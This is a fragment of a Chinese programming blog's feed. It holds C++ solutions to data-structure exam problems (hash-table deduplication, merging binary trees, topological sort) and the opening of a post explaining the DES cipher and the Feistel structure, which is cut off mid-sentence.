status[i]=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>* hashtable=<span class="keyword">new</span> <span class="type">int</span>[<span class="number">2</span>*currentLength];<span class="comment">//创建哈希表</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>*currentLength;++i)&#123;<span class="comment">//哈希表初始化</span></span><br><span class="line">            hashtable[i]=noData;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLength;++i)&#123;</span><br><span class="line">            <span class="type">int</span> pos=data[i]%(<span class="number">2</span>*currentLength);<span class="comment">//获得哈希值</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(hashtable[pos]!=noData&amp;&amp;hashtable[pos]!=data[i]) (++pos)%(<span class="number">2</span>*currentLength);<span class="comment">//定位到第一个可以插入的位置</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(hashtable[pos]==data[i])&#123;</span><br><span class="line">                status[i]=<span class="literal">true</span>;<span class="comment">//如果有该元素，标记为待删除元素</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                hashtable[pos]=data[i];<span class="comment">//没有该元素，插入该元素</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="comment">//end for</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> newLength=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> oldLength=currentLength;</span><br><span class="line">        <span class="type">int</span>* tmp=<span class="keyword">new</span> <span class="type">int</span>[currentLength];<span class="comment">//装载没被删去的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLength;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!status[i])&#123;<span class="comment">//如果判断数组对应位置为假，保留该数字</span></span><br><span class="line">                tmp[j]=data[i];</span><br><span class="line">                ++j;</span><br><span class="line">                newLength++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span>[] data;<span class="comment">//内存管理</span></span><br><span class="line">        data=tmp;<span class="comment">//数据内容更新</span></span><br><span class="line">        <span class="keyword">delete</span>[] hashtable;</span><br><span class="line">        currentLength=newLength;<span class="comment">//更新数组长度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (oldLength-currentLength);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>  <strong>总结：</strong> 对于需要反复回溯已遍历元素中某个元素出现与否的，哈希表是一个很好的解决方式，可以减少<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的算法复杂度。注意哈希表的重点：<strong>哈希函数</strong>和<strong>冲突解决</strong>。</p><h3 id="例题二二叉树"><a class="markdownIt-Anchor" href="#例题二二叉树"></a> 例题二：二叉树</h3><p>  给定两个二叉树，想象当你将它们中的一个覆盖到另一个上时，两个二叉树的一些节点便会重叠。请完善下列算法，实现将上述两个二叉树合并为一个新的二叉树。合并的规则是如果两个节点重叠，那么将他们的值相加作为节点合并后的新值，否则不为 NULL 的节点将直接作为新二叉树的节点。注意：合并后的二叉树中结点允许直接使用这两个二叉树上的结点。给出二叉树的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">binaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>&#123;<span class="comment">//二叉树的节点类</span></span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        node* left;</span><br><span class="line">        node* right;</span><br><span class="line">        <span class="built_in">node</span>(<span class="type">int</span> val)&#123;<span class="comment">//构造函数</span></span><br><span class="line">            value=val;</span><br><span class="line">            left=<span class="literal">NULL</span>;</span><br><span class="line">            right=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    node* root;<span class="comment">//二叉树的根节点</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function">node* <span class="title">mergeTrees</span><span class="params">(node* t1, node* t2)</span></span>&#123;<span class="comment">//合并二树</span></span><br><span class="line">        <span class="comment">//add your code here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>  想法是：合并二树可以看成三个过程：<strong>合并根节点</strong>、<strong>递归调用合并左右子树</strong>。因此，合并二树的操作并不难，只需要注意递归跳出的条件：其中一棵树为空树即可。为了完成代码的检查，我们还需要复习一遍二叉树的构建和层次遍历的知识点。以下代码包含了测试代码，可以直接运行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">binaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>&#123;<span class="comment">//二叉树的节点类</span></span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        node* left;</span><br><span class="line">        node* right;</span><br><span class="line">        <span class="built_in">node</span>(<span class="type">int</span> val)&#123;<span class="comment">//构造函数</span></span><br><span class="line">            value=val;</span><br><span class="line">            left=<span class="literal">NULL</span>;</span><br><span class="line">            right=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    node* root;<span class="comment">//二叉树的根节点</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">binaryTree</span>()&#123;<span class="comment">//基于层次遍历的构造函数</span></span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        <span class="type">int</span> lval;</span><br><span class="line">        <span class="type">int</span> rval;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;input the root:&quot;</span>;</span><br><span class="line">        cin&gt;&gt;val;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        root=<span class="keyword">new</span> <span class="built_in">node</span>(val);</span><br><span class="line">        queue&lt;node*&gt; que1;</span><br><span class="line">        que<span class="number">1.</span><span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!que<span class="number">1.</span><span class="built_in">empty</span>())&#123;</span><br><span class="line">            node* tmp=que<span class="number">1.f</span>ront();</span><br><span class="line">            que<span class="number">1.</span><span class="built_in">pop</span>();</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;input the two children of the given node &quot;</span>&lt;&lt;tmp-&gt;value&lt;&lt;<span class="string">&quot;:&quot;</span>;</span><br><span class="line">            cin&gt;&gt;lval&gt;&gt;rval;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">if</span>(lval)&#123;</span><br><span class="line">                tmp-&gt;left=<span class="keyword">new</span> <span class="built_in">node</span>(lval);</span><br><span class="line">                que<span class="number">1.</span><span class="built_in">push</span>(tmp-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(rval)&#123;</span><br><span class="line">                tmp-&gt;right=<span class="keyword">new</span> <span class="built_in">node</span>(rval);</span><br><span class="line">                que<span class="number">1.</span><span class="built_in">push</span>(tmp-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;binarytree has been built!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">binaryTree</span>(node* r)&#123;<span class="comment">//给定根节点的构造函数</span></span><br><span class="line">        root=r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;<span class="comment">//层次遍历</span></span><br><span class="line">        queue&lt;node&gt; que1;</span><br><span class="line">        que<span class="number">1.</span><span class="built_in">push</span>(*root);</span><br><span class="line">        <span class="keyword">while</span>(!que<span class="number">1.</span><span class="built_in">empty</span>())&#123;</span><br><span class="line">            node tmp=que<span class="number">1.f</span>ront();</span><br><span class="line">            que<span class="number">1.</span><span class="built_in">pop</span>();</span><br><span class="line">            cout&lt;&lt;tmp.value&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(tmp.left)&#123;</span><br><span class="line">                que<span class="number">1.</span><span class="built_in">push</span>(*(tmp.left));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(tmp.right)&#123;</span><br><span class="line">                que<span class="number">1.</span><span class="built_in">push</span>(*(tmp.right));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;display completed!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">node* <span class="title">findRoot</span><span class="params">()</span></span>&#123;<span class="comment">//返回二叉树根节点的位置</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">node* <span class="title">mergeTrees</span><span class="params">(node* t1, node* t2)</span></span>&#123;<span class="comment">//合并二树</span></span><br><span class="line">        <span class="keyword">if</span>(!t1) <span class="keyword">return</span> t2;<span class="comment">//递归跳出条件，即其中一棵树是空树</span></span><br><span class="line">        <span class="keyword">if</span>(!t2) <span class="keyword">return</span> t1;</span><br><span class="line"></span><br><span class="line">        node* t3=<span class="keyword">new</span> <span class="built_in">node</span>(t1-&gt;value+t2-&gt;value);</span><br><span class="line">        t3-&gt;left=<span class="built_in">mergeTrees</span>(t1-&gt;left,t2-&gt;left);<span class="comment">//假定该函数能够完成合并二树的操作，只需要对左右子树递归调用</span></span><br><span class="line">        t3-&gt;right=<span class="built_in">mergeTrees</span>(t1-&gt;right,t2-&gt;right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> t3;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    binaryTree tree1;</span><br><span class="line">    tree<span class="number">1.</span><span class="built_in">display</span>();</span><br><span class="line">    binaryTree tree2;</span><br><span class="line">    tree<span class="number">2.</span><span class="built_in">display</span>();<span class="comment">//构建两棵树并展示之</span></span><br><span class="line">    <span class="function">binaryTree <span class="title">tree3</span><span class="params">(tree<span class="number">1.</span>mergeTrees(tree<span class="number">1.f</span>indRoot(),tree<span class="number">2.f</span>indRoot()))</span></span>;<span class="comment">//合并子树</span></span><br><span class="line">    tree<span class="number">3.</span><span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题三拓扑排序"><a class="markdownIt-Anchor" href="#例题三拓扑排序"></a> 例题三：拓扑排序</h3><p>  <strong>题面：</strong> 学生需要修读完所有的课程才能毕业，这些课程之间有先导关系（比如要修读数据结构，必须先修读程序设计思想方法）。假设任意一门课程可以在任何一个学期给满足条件的学生选修，且学生每个学期可以选修的课程数不限。先给出一些课程与课程之间的关系，求能够修完所有课程的最少学期数。</p><p>  <strong>输入格式：</strong> 第1行：n m //正整数n ，代表课程的数量。非负整数m代表要给出几个先导关系。第2行到第1+m行: a b //每行两个整数：代表要选修编号为a的课程，必须先修读编号为b的课程。</p><p>  <strong>输出格式：</strong> 一个整数，即修完所有课程的最少学期数。</p><p>  <strong>思路：</strong> 本题可以参考拓扑排序的方式，即：选取入度为零的点，将其移除，然后更新有向图；再移除入度为零的点，如此循环。实现的代码如下，主函数也已经给出，且能够编译通过。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">adjListGraph</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">edgeNode</span>&#123;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        edgeNode* next;</span><br><span class="line">        <span class="built_in">edgeNode</span>(<span class="type">int</span> e,edgeNode* n=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            end=e;</span><br><span class="line">            next=n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">verNode</span>&#123;</span><br><span class="line">        <span class="type">int</span> ver;</span><br><span class="line">        edgeNode* head;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">verNode</span>(<span class="type">int</span> val=<span class="number">0</span>)&#123;</span><br><span class="line">            ver=val;</span><br><span class="line">            head=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    verNode* verList;</span><br><span class="line">    <span class="type">int</span> Vers;</span><br><span class="line">    <span class="type">int</span>* inDegree;<span class="comment">//入度统计数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">adjListGraph</span>(<span class="type">int</span> vSize)&#123;<span class="comment">//构造函数</span></span><br><span class="line">        Vers=vSize;</span><br><span class="line">        verList=<span class="keyword">new</span> verNode[Vers<span class="number">+1</span>];</span><br><span class="line">        inDegree=<span class="keyword">new</span> <span class="type">int</span>[Vers<span class="number">+1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=Vers;++i)&#123;</span><br><span class="line">            verList[i].ver=i;</span><br><span class="line">            inDegree[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> end,<span class="type">int</span> in)</span></span>&#123;</span><br><span class="line">        verList[in].head=<span class="keyword">new</span> <span class="built_in">edgeNode</span>(end,verList[in].head);</span><br><span class="line">        inDegree[end]++;<span class="comment">//入度增加</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">topSort</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> remain=Vers;<span class="comment">//剩余未被删除的元素个数，用于判断循环结束</span></span><br><span class="line">        <span class="type">int</span> current;<span class="comment">//当前将要出队的元素</span></span><br><span class="line">        queue&lt;verNode&gt; que1;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(remain!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=Vers;++i)&#123;</span><br><span class="line">                <span class="keyword">if</span>(inDegree[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                    que<span class="number">1.</span><span class="built_in">push</span>(verList[i]);<span class="comment">//入度为零的点入队</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="comment">//end for</span></span><br><span class="line">            <span class="keyword">while</span>(!que<span class="number">1.</span><span class="built_in">empty</span>())&#123;</span><br><span class="line">                current=que<span class="number">1.f</span>ront().ver;</span><br><span class="line">                que<span class="number">1.</span><span class="built_in">pop</span>();</span><br><span class="line">                edgeNode*p=verList[current].head;</span><br><span class="line">                <span class="keyword">while</span>(p)&#123;</span><br><span class="line">                    inDegree[p-&gt;end]--;<span class="comment">//该出队元素所指向的元素入度自减</span></span><br><span class="line">                    p=p-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                remain--;</span><br><span class="line">                inDegree[current]=<span class="number">-1</span>;<span class="comment">//已修完的课在下一次循环不需要被读取</span></span><br><span class="line">            &#125;</span><br><span class="line">            counter++;<span class="comment">//完成后计数器增加</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> counter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m;<span class="comment">//课程数量、先导关系</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="function">adjListGraph <span class="title">graph</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;++i)&#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        graph.<span class="built_in">insert</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;graph.<span class="built_in">topSort</span>()&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  上述程序中指定队列的原因是，为了区分出每一学期修了多少门课。每一个学期进行一次统一的入队操作，而后出队直至队空为止。</p>]]></content>
    
    
    <summary type="html">本文选择了数据结构的一些考题，给出了完整的代码实现。</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="算法" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构" scheme="https://blog.snowflake.zone/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>DES加密算法</title>
    <link href="https://blog.snowflake.zone/posts/3/"/>
    <id>https://blog.snowflake.zone/posts/3/</id>
    <published>2022-05-18T02:58:16.000Z</published>
    <updated>2022-05-18T02:58:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>DES加密算法是目前使用最广泛的对称加密算法。它体现了对称加密算法中最经典的Feistel结构。尽管DES加密算法注定要为新的加密标准让出位置，但依旧是我们深入理解对称加密的最好的例子。</p><span id="more"></span><h1 id="feistel结构设计"><a class="markdownIt-Anchor" href="#feistel结构设计"></a> Feistel结构设计</h1><h2 id="流密码与分组密码"><a class="markdownIt-Anchor" href="#流密码与分组密码"></a> 流密码与分组密码</h2><p>  在最开始，我们有必要了解一下流密码和分组密码。对于明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>，我们有两种加密方式，一种是逐位加密，我们称这种加密方式为<strong>流密码</strong>；另一种方式是按照一定的长度作为一组一同加密，这样的加密方式称为<strong>分组密码</strong>。流密码的典型例子是凯撒密码，它就是对明文逐位加密的。相较于流密码，我们实际应用中更偏向于使用分组密码，因为流密码有一个缺陷：如果密钥长度不足，那么字符的统计规律就难以被隐藏，很容易受到基于统计的攻击。分组密码在一定程度上会更多地抹去统计信息，因此也就显得更安全。我们主要讨论分组密码。</p><h2 id="feistel密码结构的设计动机"><a class="markdownIt-Anchor" href="#feistel密码结构的设计动机"></a> Feistel密码结构的设计动机</h2><p>  我们不妨假设分组密码作用在长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的明文分组上，相应地，我们得到相同长度的密文。我们假设明文信息流是<strong>二进制流</strong>，那么长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的分组至多有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>中情况。考虑到我们需要从密文复原到明文，因此，我们选择的分组替代方式应该是<strong>单射</strong>的。我们称这样的变换为<strong>可逆变换</strong>，也叫<strong>非奇异变换</strong>。上述例子中，非奇异变换一共有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">2^n!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">!</span></span></span></span>种 <em>（注：对于第一个分组，我们可以从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>中选取一个映射；对于第二个，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>种；以此类推）</em>。这种加密方式下，映射表格就是密钥。这样看来，我们具有很大的密钥空间，任意一种分组情况选取的映射是任意的。我们称这种加解密映射为<strong>任意可逆变换</strong>。Feistel称这种密码为理想分组密码，因为<strong>它允许生成最大数量的加密映射来映射明文分组</strong>。</p><p>  然而，这种方法是难以应用的。如果我们分组的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 